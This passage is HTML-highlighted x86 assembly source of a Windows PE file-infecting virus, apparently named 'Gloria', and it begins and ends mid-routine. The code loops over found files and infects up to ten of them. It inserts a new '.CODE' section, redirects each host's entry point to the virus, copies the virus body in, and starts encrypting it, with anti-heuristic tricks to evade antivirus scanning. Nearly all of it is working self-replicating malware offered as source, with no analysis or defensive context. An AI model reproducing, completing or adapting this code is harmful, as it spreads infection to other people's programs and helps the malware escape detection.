        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_file_size</span><span class="sc4">],(</span><span class="sc5">vir_size</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_file_size</span><span class="sc4">],(</span><span class="sc5">vir_size</span><span class="sc4">+</span><span class="sc2">200h</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc1">; mark this infection</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">files_infect</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; Unmap it</span><span class="sc0">

</span><span class="sc5">unmap_attr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unmap</span><span class="sc0">

</span><span class="sc5">attr_res</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">file_data.FileAttributes</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">path_name</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">check_how</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">files_infect</span><span class="sc4">],</span><span class="sc2">0Ah</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">close_find</span><span class="sc0">

</span><span class="sc5">find_next_file</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">file_data</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_find</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindNextFileA</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">close_find</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infect_loop</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">     </span><span class="sc1">; The next call will never be found.</span><span class="sc0">

</span><span class="sc5">close_find</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_find</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindClose</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ret_infect_loop</span><span class="sc4">:</span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">process_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; infection routine</span><span class="sc0">
        </span><span class="sc1">; put new section named ".CODE"</span><span class="sc0">
        </span><span class="sc1">; as first section</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_addr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">peofs</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">peofs</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi._nt</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tableofs</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi._objects</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi._objects</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; add 1 object</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">all_sec_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tableofs</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsection</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_addr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; mark infection</span><span class="sc0">

                </span><span class="sc1">; Save usefull values</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi._entry</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">old_value_rva</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi._image_base</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">old_imagebase</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi._obj_ln</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">objalign</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi._file_ln</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filealign</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsection</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">objalign</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">align_proc</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsection</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi._RVA</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virus_entry</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filealign</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">vir_size</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">align_proc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi._physical_sz</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; physical size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">physicalsize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; physical size</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">objalign</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">virtual_size_gl</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">align_proc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi._virtual_sz</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; virtual size</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filealign</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">align_proc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi._physical_off</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_addr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_real_ofs</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; store new section named ".CODE"</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi._obj_flags</span><span class="sc4">],</span><span class="sc2">0C0000080h</span><span class="sc0">   </span><span class="sc1">; flags</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">edi._name_sec</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">my_section</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">peofs</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">virtual_size_gl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi._img_sz</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">objalign</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">align_proc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi._img_sz</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virus_entry</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi._entry</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; copy sections to my buffer</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">section_space</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tableofs</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">all_sec_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc1">; replace the first section</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsection</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tableofs</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc1">; and copy the rest</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">section_space</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tableofs</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">all_sec_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc1">; calculate new offsets</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virus_entry</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">old_imagebase</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">area_crypt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">Gloria</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">replace_addr</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">old_imagebase</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">anti_heuristic</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">Gloria</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">replace_heur</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">; And copy our virus to file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_real_ofs</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">Gloria</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">entry_fim</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Gloria</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virus_crypt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_real_ofs</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">area_crypt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">Gloria</span><span class="sc0">

        </span><span class="sc1">; encrypt code</span><span class="sc0">

